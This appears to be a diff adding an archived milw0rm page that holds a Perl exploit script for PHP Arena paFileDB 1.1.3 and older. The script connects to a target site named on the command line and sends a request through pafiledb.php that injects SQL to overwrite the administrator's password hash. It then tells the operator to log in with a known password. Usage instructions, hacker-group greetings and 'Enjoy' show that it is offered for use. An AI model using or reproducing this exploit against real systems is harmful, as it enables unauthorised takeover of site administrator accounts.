@@ -1,0 +1,54 @@
+<html><head><title>PHP Arena <= 1.1.3 pafiledb.php Remote Change Password Exploit</title></head><pre>#!/usr/bin/perl
+######################################################################################
+#        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           #
+######################################################################################
+#  EXPLOIT FOR:   PHP Arena paFileDB 1.1.3 And 0lder                                 #
+#                                                                                    #
+#Expl0it By: A l p h a _ P r o g r a m m e r (Sirus-v)                               #
+#Email: Alpha_Programmer@LinuxMail.ORG                                               #
+#                                                                                    #
+#                                                                                    #
+# + Discovered By: GulfTech                                                          #
+# + Advisory: http://www.securityfocus.com/bid/13967                                 #
+#Vulnerable:   PHP Arena paFileDB 1.1.3 and Older                                    #
+######################################################################################
+# GR33tz T0 ==&gt;     mh_p0rtal  --  oil_Karchack  --  Dr_CephaleX  -- Str0ke          #
+#And Iranian Security &amp; Hacking Groups:                                              #
+#                                                                                    #
+#      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &amp;  Emperor           #
+######################################################################################
+
+use IO::Socket;
+if (@ARGV &lt; 2)
+{
+  print &quot;\n====================================================\n&quot;;
+  print &quot; \n       PHPArena Exploit By Alpha Programmer\n\n&quot;;
+  print &quot;       Trap-Set Underground Hacking Team      \n\n&quot;;
+  print &quot;           Usage: &lt;T4rg3t&gt; &lt;DIR&gt;\n\n&quot;;
+  print &quot;====================================================\n\n&quot;;
+  print &quot;Examples:\n\n&quot;;
+  print &quot;    xpl.pl www.Site.com / \n&quot;;
+  exit();
+}
+
+my $host = $ARGV[0];
+my $dir = $ARGV[1];
+my $remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host,
+PeerPort =&gt; &quot;80&quot; );
+unless ($remote) { die &quot;C4nn0t C0nn3ct to $host&quot; }
+print &quot;\n\n[+] C0nn3cted\n&quot;;
+$http = &quot;pafiledb.php?action=team&amp;tm=file&amp;file=edit&amp;id=1&amp;edit=do&amp;query=UPDATE%20pafiledb_admin%20SET%20admin_password%20=%20c15c493548d09ffd03c9d41d8bbbfeef%281337%28%20WHERE%201/*\n&quot;;
+$http .= &quot;Host: $host\n\r\n\r&quot;;
+print &quot;[+] Injecting SQL Commands ...\n&quot;;
+sleep(1);
+print &quot;[+] Changing Admin's Password ...\n&quot;;
+print $remote $http;
+sleep(1);
+while (&lt;$remote&gt;)
+{
+}
+print &quot;[+] Now , Login With This Password :\n&quot;;
+print &quot;Password : trapset\n\n&quot;;
+print &quot;Enjoy ;) \n\n&quot;;
+
+# milw0rm.com [2005-06-15]</pre></html>
